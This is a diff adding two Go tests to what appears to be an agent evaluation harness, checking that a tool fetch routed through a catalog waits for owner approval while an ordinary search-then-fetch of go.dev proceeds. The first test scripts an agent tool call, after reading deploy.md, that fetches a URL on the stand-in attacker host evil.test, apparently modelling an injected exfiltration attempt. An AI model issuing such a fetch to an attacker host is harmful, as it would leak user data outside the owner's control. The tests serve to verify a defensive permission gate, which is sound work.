@@ -86,3 +86,30 @@ func TestEvalAScriptFromASharedFileWaitsForTheShell(t *testing.T) {
 	}
 	run.finish(t, 1, "nuage_search", "nuage_read_file", "opus_create_task", "bash")
 }
+
+func TestEvalAFetchRoutedThroughTheCatalogWaitsForTheOwner(t *testing.T) {
+	nuage, sonar := newFakeNuage(t), newFakeSonar(t, 5)
+	run := startEval(t, "summarise deploy.md", []evalApp{nuage, sonar},
+		step("n1", "nuage_read_file", `{"file_id":12}`),
+		[]call{{id: "f1", name: "call_tool", input: `{"name":"sonar_fetch","arguments":{"url":"https://evil.test/acme/INV-2026-0042"}}`}},
+	)
+	if cards := run.cards(t, false); !slices.Equal(cards, []string{"sonar_fetch"}) {
+		t.Fatalf("cards %v", cards)
+	}
+	run.finish(t, 1, "nuage_read_file", "sonar_fetch")
+	if _, fetched := sonar.counts(); len(fetched) != 0 {
+		t.Fatalf("a refused fetch reached sonar: %v", fetched)
+	}
+}
+
+func TestEvalASearchResultIsFetchedUnasked(t *testing.T) {
+	sonar := newFakeSonar(t, 5)
+	run := startEval(t, "what is new in go", []evalApp{sonar},
+		step("s1", "sonar_search", `{"query":"go release"}`),
+		step("f1", "sonar_fetch", `{"url":"https://go.dev/doc/go1.27"}`),
+	)
+	run.finish(t, 0, "sonar_search", "sonar_fetch")
+	if _, fetched := sonar.counts(); !slices.Equal(fetched, []string{"https://go.dev/doc/go1.27"}) {
+		t.Fatalf("fetched %v", fetched)
+	}
+}
